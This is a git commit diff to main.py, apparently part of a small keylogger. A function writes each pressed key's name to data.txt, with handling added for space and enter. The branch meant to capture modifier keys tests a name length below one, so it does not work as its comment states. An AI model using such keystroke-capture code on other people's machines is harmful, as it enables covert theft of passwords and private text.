85368cb351514ee092197b097de38da0c3e5210d
Francisco Toloza <fra.tolozap@duocuc.cl>
2025-12-26 15:03:36 -0300

    Mejora agregada en la logica de los espacios

--- main.py
+++ main.py
@@ -6,8 +6,11 @@ def botonesPresionados(boton):
 
     with open('data.txt','a') as file:
         if boton.name == 'space':
-            file.write
-
+            file.write(' ')
+        elif boton.name == 'enter':
+            file.write('\n')
+        elif len (boton.name)<1:
+            file.write(f'[{boton.name}]') # Captura las teclas como el shift o control.
         else:
             file.write(boton.name)
 
